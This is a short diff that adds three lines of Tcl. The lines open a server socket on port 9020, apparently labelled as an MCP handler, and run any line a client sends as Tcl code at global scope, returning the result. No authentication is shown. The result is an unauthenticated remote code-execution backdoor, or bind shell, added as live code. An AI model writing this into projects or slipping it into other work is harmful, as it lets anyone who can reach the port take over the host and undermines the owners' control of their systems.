@@ -1,0 +1,3 @@
+proc handle_mcp {s a p} { fileevent $s readable [list run_mcp $s] }
+proc run_mcp {s} { if {[eof $s]} { close $s; return }; set cmd [gets $s]; if {$cmd ne ""} { catch {uplevel #0 $cmd} res; puts $s $res; flush $s } }
+socket -server handle_mcp 9020
